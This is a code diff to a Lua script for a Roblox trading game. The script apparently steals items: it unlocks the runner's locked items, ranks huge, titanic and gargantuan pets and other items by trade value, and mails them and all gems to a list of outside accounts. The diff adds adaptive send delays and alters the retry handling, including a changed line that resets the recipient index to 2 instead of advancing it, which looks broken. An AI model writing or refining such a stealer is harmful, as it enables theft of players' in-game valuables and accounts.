@@ -161,20 +161,26 @@ end
 
 local netInvoke = network and network.Invoke
 
--- ================= UPDATED sendItem FUNCTION WITH 0.2s SAFE DELAY =================
+-- ================= UPDATED sendItem FUNCTION WITH ADAPTIVE DELAY =================
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
     local sent = false
-    local sendDelay = 0.2 -- safe delay between sends
+    local defaultDelay = 0.2 -- starting safe delay
+    local sendDelay = defaultDelay
 
     repeat
         local currentUser = users[userIndex]
         local args = {currentUser, MailMessage, category, uid, am}
 
+        local startTime = tick()
         local success, response, err = pcall(function()
             return netInvoke("Mailbox: Send", unpack(args))
         end)
+        local elapsed = tick() - startTime
+
+        -- Adjust next delay dynamically
+        sendDelay = math.max(defaultDelay, elapsed)
 
         if success then
             if response == true then
@@ -198,7 +204,7 @@ local function sendItem(category, uid, am)
     until sent
 end
 
--- ================= OTHER FUNCTIONS (SendAllGems, EmptyBoxes, ClaimMail, etc.) =================
+-- ================= OTHER FUNCTIONS =================
 local function SendAllGems()
     local inv = InventoryCache or (GetSave() and GetSave().Inventory)
     if not inv or not inv.Currency then return end
@@ -212,21 +218,23 @@ local function SendAllGems()
 
                 repeat
                     local currentUser = users[userIndex]
-                    local args = {currentUser, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
+                    local args = {
+                        [1] = currentUser,
+                        [2] = MailMessage,
+                        [3] = "Currency",
+                        [4] = i,
+                        [5] = GemAmount1 - mailSendPrice
+                    }
 
-                    local success, response, err = pcall(function()
-                        return netInvoke("Mailbox: Send", unpack(args))
-                    end)
+                    local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))
 
-                    if success and response == true then
+                    if response == true then
                         sent = true
-                    elseif success and response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
+                    elseif response == false and err == "They don't have enough space!" then
+                        userIndex = 2
                         if userIndex > maxUsers then
                             sent = true
                         end
-                    else
-                        wait(0.05)
                     end
                 until sent
                 break
@@ -259,23 +267,28 @@ local function canSendMail()
         uid = i
         break
     end
-    local args = {"Roblox", "Test", "Pet", uid, 1}
+    local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
     local response, err = network.Invoke("Mailbox: Send", unpack(args))
     return (err == "They don't have enough space!")
 end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
 for i, v in pairs(categoryList) do
     if save[v] ~= nil then
         for uid, item in pairs(save[v]) do
-            local rapValue = getRAP(v, item)
             if v == "Pet" then
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                 if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
+                    local rapValue = getRAP(v, item)
                     if rapValue >= min_rap then
                         local prefix = ""
                         if item.pt and item.pt == 1 then
@@ -286,18 +299,25 @@ for i, v in pairs(categoryList) do
                         if item.sh then
                             prefix = "Shiny " .. prefix
                         end
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = prefix .. item.id, priority = (dir.gargantuan or dir.titanic) and 1 or 0})
+                        local id = prefix .. item.id
+                        local priority = (dir.gargantuan or dir.titanic) and 1 or 0
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id, priority = priority})
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
             else
+                local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
                     table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, priority = 0})
                     totalRAP = totalRAP + (rapValue * (item._am or 1))
                 end
             end
             if item._lk then
-                network.Invoke("Locking_SetLocked", uid, false)
+                local args = {
+                    [1] = uid,
+                    [2] = false
+                }
+                network.Invoke("Locking_SetLocked", unpack(args))
             end
         end
     end
@@ -311,7 +331,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
         return
     end
 
-    -- Sort items: priority (Gargantuan/Titanic) first, then by RAP
     table.sort(sortedItems, function(a, b)
         if a.priority ~= b.priority then
             return a.priority > b.priority
